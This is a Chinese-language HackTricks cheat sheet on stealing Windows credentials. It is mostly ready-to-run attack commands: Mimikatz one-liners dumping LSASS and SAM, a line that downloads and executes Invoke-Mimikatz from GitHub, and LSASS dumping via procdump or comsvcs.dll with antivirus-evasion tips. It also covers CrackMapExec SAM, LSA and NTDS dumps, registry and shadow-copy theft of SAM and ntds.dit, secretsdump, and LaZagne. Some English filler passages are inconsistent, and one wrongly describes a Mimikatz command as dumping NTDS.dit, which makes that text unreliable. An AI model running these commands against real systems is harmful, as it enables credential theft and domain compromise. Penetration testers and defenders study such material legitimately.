# 窃取Windows凭据

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一个**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

## Mimikatz凭据窃取
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
### 调用Mimikatz

Invoke-Mimikatz是一个PowerShell脚本，它利用Mimikatz工具来提取Windows系统中的凭据。Mimikatz是一个强大的工具，可以用于从内存中提取明文密码、哈希值和其他凭据。

#### 使用方法

要使用Invoke-Mimikatz脚本，首先需要下载Mimikatz工具并将其放置在合适的位置。然后，可以按照以下步骤使用Invoke-Mimikatz脚本：

1. 打开PowerShell控制台。
2. 导航到Mimikatz工具所在的目录。
3. 运行以下命令以加载Invoke-Mimikatz脚本：

```powershell
Import-Module .\Invoke-Mimikatz.ps1
```

4. 运行以下命令以执行Mimikatz工具并提取凭据：

```powershell
Invoke-Mimikatz -Command "command_to_execute"
```

在`command_to_execute`中，可以使用Mimikatz支持的各种命令来执行不同的操作，例如提取明文密码、哈希值、证书等。

#### 示例

以下是一些使用Invoke-Mimikatz脚本的示例命令：

- 提取明文密码：

```powershell
Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonPasswords"
```

- 提取哈希值：

```powershell
Invoke-Mimikatz -Command "privilege::debug sekurlsa::ekeys"
```

- 提取证书：

```powershell
Invoke-Mimikatz -Command "crypto::capi"
```

请注意，使用Mimikatz工具可能会触发杀毒软件的警报，因为它被广泛用于恶意活动。在进行任何操作之前，请确保您有合法的授权和适当的权限。
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**在这里了解一些可能的凭证保护措施。**](credentials-protections.md) **这些保护措施可以防止Mimikatz提取某些凭证。**

## 使用Meterpreter获取凭证

使用我创建的[**凭证插件**](https://github.com/carlospolop/MSF-Credentials) **来搜索受害者内部的密码和哈希值**。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## 绕过杀毒软件

### Procdump + Mimikatz

由于**SysInternals的Procdump是一个合法的微软工具**，所以它不会被Defender检测到。\
您可以使用此工具来**转储lsass进程**，**下载转储文件**并从转储文件中**提取本地凭据**。

{% code title="转储lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% code title="从转储中提取凭据" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

这个过程可以使用[SprayKatz](https://github.com/aas-n/spraykatz)自动完成：`./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**：一些**杀毒软件**可能会将使用**procdump.exe转储lsass.exe**视为**恶意行为**，这是因为它们**检测到**了字符串**"procdump.exe"和"lsass.exe"**。因此，将lsass.exe的**PID**作为参数传递给procdump，而不是使用lsass.exe的名称，可以更加**隐蔽**。

### 使用**comsvcs.dll**转储lsass

在`C:\Windows\System32`目录下有一个名为**comsvcs.dll**的DLL，它在进程**崩溃**时会**转储进程内存**。这个DLL包含一个名为**`MiniDumpW`**的函数，可以使用`rundll32.exe`调用它。\
前两个参数没有使用，但第三个参数被分成了3个部分。第一部分是要转储的进程ID，第二部分是转储文件的位置，第三部分是单词**full**。没有其他选择。\
一旦解析了这3个参数，基本上这个DLL会创建转储文件，并将指定的进程转储到该转储文件中。\
借助这个函数，我们可以使用**comsvcs.dll**来转储lsass进程，而不是上传procdump并执行它。（此信息摘自[https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords/)）
```
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
我们只需要记住这个技术只能在**SYSTEM**权限下执行。

**你可以使用** [**lssasy**](https://github.com/Hackndo/lsassy)**来自动化这个过程。**

### **使用任务管理器转储lsass**

1. 右键点击任务栏，然后点击任务管理器
2. 点击更多详细信息
3. 在进程选项卡中搜索"Local Security Authority Process"进程
4. 右键点击"Local Security Authority Process"进程，然后点击"创建转储文件"。

### 使用procdump转储lsass

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump)是微软签名的二进制文件，是[sysinternals](https://docs.microsoft.com/en-us/sysinternals/)套件的一部分。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## CrackMapExec

### 转储 SAM 哈希

CrackMapExec 是一款功能强大的渗透测试工具，可以用于在 Windows 系统中执行各种攻击。其中一个功能是通过转储 SAM 哈希来获取凭据。

要使用 CrackMapExec 转储 SAM 哈希，可以使用以下命令：

```plaintext
crackmapexec <target> -u <username> -p <password> --sam
```

在这个命令中，`<target>` 是目标主机的 IP 地址或主机名，`<username>` 和 `<password>` 是具有足够权限的有效凭据。

执行此命令后，CrackMapExec 将连接到目标主机，并尝试转储 SAM 数据库中的哈希。这些哈希可以用于进一步的攻击，例如离线破解密码或进行 Pass-the-Hash 攻击。

请注意，使用 CrackMapExec 进行此操作需要足够的权限，并且仅限于合法的渗透测试活动。在未经授权的情况下使用此工具可能会违反法律。
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### 转储 LSA 密钥

#### 描述

LSA（本地安全局）是 Windows 操作系统中的一个组件，负责管理安全策略和安全凭据。LSA 密钥是存储在操作系统中的敏感信息，如密码和凭据。通过转储 LSA 密钥，黑客可以获取这些敏感信息，从而进一步入侵系统。

#### 技术细节

黑客可以使用工具（如 Mimikatz）来转储 LSA 密钥。这些工具利用操作系统中的漏洞或弱点，获取 LSA 密钥的副本。一旦黑客获得了这些密钥，他们可以使用它们来获取用户凭据、密码哈希和其他敏感信息。

#### 防御措施

为了防止黑客转储 LSA 密钥并窃取敏感信息，可以采取以下防御措施：

- 定期更新操作系统和软件，以修复已知的漏洞。
- 使用强密码策略，并定期更改密码。
- 限制对 LSA 密钥的访问权限，只授权给必要的用户和服务。
- 监控系统日志，及时发现异常活动。
- 使用安全软件和防火墙，检测和阻止恶意行为。

#### 相关链接

- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 从目标域控制器中转储NTDS.dit文件

To dump the NTDS.dit file from a target Domain Controller (DC), you can use various techniques. Here are a few methods:

#### 1. NTDSUtil

NTDSUtil is a command-line tool that allows you to manage Active Directory (AD) databases. You can use it to dump the NTDS.dit file by following these steps:

1. Open a command prompt with administrative privileges on a machine with the Remote Server Administration Tools (RSAT) installed.
2. Run the following command to enter the NTDSUtil tool:

   ```
   ntdsutil
   ```

3. Once inside the NTDSUtil tool, run the following commands to dump the NTDS.dit file:

   ```
   activate instance ntds
   ifm
   create full <path_to_dump_folder>
   ```

   Replace `<path_to_dump_folder>` with the desired location where you want to save the dumped NTDS.dit file.

#### 2. Mimikatz

Mimikatz is a powerful post-exploitation tool that can be used to extract credentials from memory. It can also be used to dump the NTDS.dit file. Here's how:

1. Obtain administrative access to a machine in the target domain.
2. Download and execute Mimikatz on the target machine.
3. Run the following command within Mimikatz to dump the NTDS.dit file:

   ```
   lsadump::lsa /inject /name:<DC_name>
   ```

   Replace `<DC_name>` with the name of the target Domain Controller.

#### 3. Volume Shadow Copy

If Volume Shadow Copy is enabled on the target Domain Controller, you can use it to access and copy the NTDS.dit file. Here's how:

1. Obtain administrative access to a machine in the target domain.
2. Open a command prompt with administrative privileges.
3. Run the following command to create a shadow copy of the NTDS volume:

   ```
   vssadmin create shadow /for=<NTDS_volume>
   ```

   Replace `<NTDS_volume>` with the drive letter or volume name where the NTDS.dit file is located.

4. Use any file transfer method (e.g., SMB, SCP) to copy the NTDS.dit file from the shadow copy location to your desired location.

These are just a few methods to dump the NTDS.dit file from a target Domain Controller. Each method has its own advantages and limitations, so choose the one that suits your specific scenario.
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 从目标域控制器中转储NTDS.dit密码历史记录

To dump the NTDS.dit password history from a target domain controller, you can use the following method:

1. Obtain the NTDS.dit file from the target domain controller. This file contains the Active Directory database, including the password hashes.

2. Use a tool like `ntdsutil` to access the NTDS.dit file. This tool is built into Windows Server and can be accessed through the command prompt.

3. Once inside `ntdsutil`, use the `activate instance ntds` command to activate the NTDS instance.

4. Next, use the `ifm` command to create an Install From Media (IFM) snapshot of the NTDS.dit file. This snapshot will allow you to access the password hashes offline.

5. After creating the IFM snapshot, exit `ntdsutil` and navigate to the location where the snapshot was created.

6. Use a tool like `dsusers.py` or `mimikatz` to extract the password hashes from the NTDS.dit file. These tools can parse the database and retrieve the password history.

By following these steps, you can successfully dump the NTDS.dit password history from a target domain controller.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 显示每个NTDS.dit账户的pwdLastSet属性

To show the `pwdLastSet` attribute for each NTDS.dit account, you can use the following PowerShell command:

```powershell
Get-ADUser -Filter * -Properties pwdLastSet | Select-Object Name, pwdLastSet
```

This command will retrieve all user accounts from the NTDS.dit database and display the `Name` and `pwdLastSet` attributes for each account.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## 盗取SAM和SYSTEM文件

这些文件应该位于_C:\windows\system32\config\SAM_和_C:\windows\system32\config\SYSTEM_。但是，**你不能简单地以常规方式复制它们**，因为它们受到保护。

### 从注册表中获取

最简单的方法是从注册表中获取这些文件的副本：
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**下载**这些文件到你的Kali机器上，并使用以下命令**提取哈希值**：
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### 卷影副本

您可以使用此服务执行受保护文件的副本。您需要是管理员。

#### 使用vssadmin

vssadmin二进制文件仅在Windows Server版本中可用。
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
但是你也可以使用**Powershell**来完成相同的操作。以下是一个示例，演示如何复制SAM文件（硬盘使用的是"C:"，保存到C:\users\Public），但你也可以使用此方法复制任何受保护的文件：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
代码来自书籍：[https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

最后，你还可以使用[**PS脚本Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1)来复制SAM、SYSTEM和ntds.dit文件。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory凭据 - NTDS.dit**

**Ntds.dit文件是存储Active Directory数据的数据库**，包括有关用户对象、组和组成员的信息。它包含域中所有用户的密码哈希值。

重要的NTDS.dit文件将**位于**：_%SystemRoom%/NTDS/ntds.dit_\
该文件是一个_可扩展存储引擎_（ESE）数据库，"官方"由3个表组成：

* **数据表**：包含对象（用户、组等）的信息
* **链接表**：关系的信息（成员关系等）
* **SD表**：包含每个对象的安全描述符

有关更多信息，请访问：[http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows使用_Ntdsa.dll_与该文件进行交互，并由_lsass.exe_使用。然后，**NTDS.dit**文件的**一部分**可能位于**`lsass`**内存中（您可以通过使用**缓存**来找到最近访问的数据，可能是因为性能改进）。

#### 解密NTDS.dit中的哈希值

哈希值被加密了3次：

1. 使用**BOOTKEY**和**RC4**解密密码加密密钥（**PEK**）。
2. 使用**PEK**和**RC4**解密**哈希值**。
3. 使用**DES**解密**哈希值**。

**PEK**在**每个域控制器**中具有**相同的值**，但它在**NTDS.dit**文件中使用**域控制器的SYSTEM文件的BOOTKEY（在域控制器之间是不同的）**进行加密。这就是为什么要从NTDS.dit文件中获取凭据，**您需要NTDS.dit和SYSTEM文件**（_C:\Windows\System32\config\SYSTEM_）。

### 使用Ntdsutil复制NTDS.dit

自Windows Server 2008以来可用。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
你还可以使用[**卷影复制**](./#stealing-sam-and-system)技巧来复制**ntds.dit**文件。记住，你还需要**SYSTEM文件**的副本（同样，[**从注册表中转储它或使用卷影复制**](./#stealing-sam-and-system)技巧）。

### **从NTDS.dit中提取哈希值**

一旦你**获取到**了**NTDS.dit**和**SYSTEM**文件，你可以使用工具如_secretsdump.py_来**提取哈希值**：
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
您还可以使用有效的域管理员用户**自动提取它们**：
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
对于**大型的NTDS.dit文件**，建议使用[gosecretsdump](https://github.com/c-sto/gosecretsdump)来提取它。

最后，您还可以使用**metasploit模块**：_post/windows/gather/credentials/domain\_hashdump_或**mimikatz** `lsadump::lsa /inject`

### **将NTDS.dit中的域对象提取到SQLite数据库中**

可以使用[ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite)将NTDS对象提取到SQLite数据库中。不仅提取了密码，还提取了整个对象及其属性，以便在已经获取到原始NTDS.dit文件时进行进一步的信息提取。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive是可选的，但可以用于解密秘密（NT和LM哈希，附加凭据，如明文密码，Kerberos或信任密钥，NT和LM密码历史记录）。除其他信息外，还提取以下数据：用户和计算机帐户及其哈希值，UAC标志，最后登录和更改密码的时间戳，帐户描述，名称，UPN，SPN，组和递归成员，组织单位树和成员，具有信任类型，方向和属性的受信任域...

## Lazagne

从[这里](https://github.com/AlessandroZ/LaZagne/releases)下载二进制文件。您可以使用此二进制文件从多个软件中提取凭据。
```
lazagne.exe all
```
## 从SAM和LSASS中提取凭据的其他工具

### Windows凭据编辑器（WCE）

该工具可用于从内存中提取凭据。从以下链接下载：[http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

从SAM文件中提取凭据
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

从SAM文件中提取凭据

```plaintext
PwDump is a tool that allows you to extract credentials from the Security Account Manager (SAM) file in Windows. The SAM file contains password hashes for local user accounts on the system.

To use PwDump, you need to have administrative privileges on the target system. Once you have obtained the SAM file, you can run PwDump to extract the password hashes.

PwDump works by reading the SAM file and decrypting the password hashes using the system's encryption keys. It then outputs the decrypted password hashes in a format that can be easily cracked using password cracking tools like John the Ripper or Hashcat.

It is important to note that PwDump only works on offline systems, meaning you need to have physical access to the target system or have obtained a copy of the SAM file through other means. Additionally, PwDump may trigger antivirus alerts due to its nature as a password dumping tool.

To use PwDump, follow these steps:

1. Obtain administrative privileges on the target system.
2. Obtain a copy of the SAM file from the target system.
3. Run PwDump on the SAM file to extract the password hashes.
4. Use password cracking tools to crack the extracted password hashes.

Keep in mind that extracting credentials from the SAM file without proper authorization is illegal and unethical. PwDump should only be used for legitimate purposes, such as penetration testing or password recovery on systems you have permission to access.
```

```plaintext
PwDump是一种工具，允许您从Windows的安全账户管理器（SAM）文件中提取凭据。SAM文件包含系统上本地用户账户的密码哈希。

要使用PwDump，您需要在目标系统上具有管理员权限。一旦您获得了SAM文件，您可以运行PwDump来提取密码哈希。

PwDump的工作原理是通过读取SAM文件并使用系统的加密密钥解密密码哈希。然后，它以易于使用密码破解工具（如John the Ripper或Hashcat）破解的格式输出解密的密码哈希。

重要的是要注意，PwDump仅适用于离线系统，这意味着您需要物理访问目标系统或通过其他方式获得SAM文件的副本。此外，由于其作为密码转储工具的性质，PwDump可能会触发防病毒警报。

要使用PwDump，请按照以下步骤操作：

1. 在目标系统上获得管理员权限。
2. 从目标系统获取SAM文件的副本。
3. 在SAM文件上运行PwDump以提取密码哈希。
4. 使用密码破解工具破解提取的密码哈希。

请记住，在没有适当授权的情况下从SAM文件中提取凭据是非法和不道德的。PwDump应仅用于合法目的，例如渗透测试或在您有权限访问的系统上进行密码恢复。
```
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

从[http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7)下载并**执行它**，密码将被提取。

## 防御措施

[**在这里了解一些凭据保护措施。**](credentials-protections.md)



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中**宣传你的公司**吗？或者你想要**获取PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品——[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>
